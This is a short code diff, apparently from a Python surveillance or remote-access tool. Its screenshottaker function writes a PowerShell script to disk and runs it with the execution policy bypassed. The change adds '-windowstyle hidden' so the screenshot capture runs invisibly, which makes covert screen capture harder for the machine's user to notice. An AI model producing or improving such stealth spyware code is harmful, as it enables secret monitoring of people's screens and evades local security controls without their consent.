@@ -96,7 +96,7 @@ def screenshottaker():
         f.write(SCREENSHOT_SCRIPT)
         f.close()
     #Get the screenshot
-    command = f"powershell -ep Bypass .\{SCREENSHOT_SCRIPT_PATH} save-screenshot"
+    command = f"powershell -ep Bypass -windowstyle hidden .\{SCREENSHOT_SCRIPT_PATH} save-screenshot"
     run_command(command)
     if os.path.exists(os.path.expandvars(FOLDER_PATH+"\\screenshot.png")):
         return True
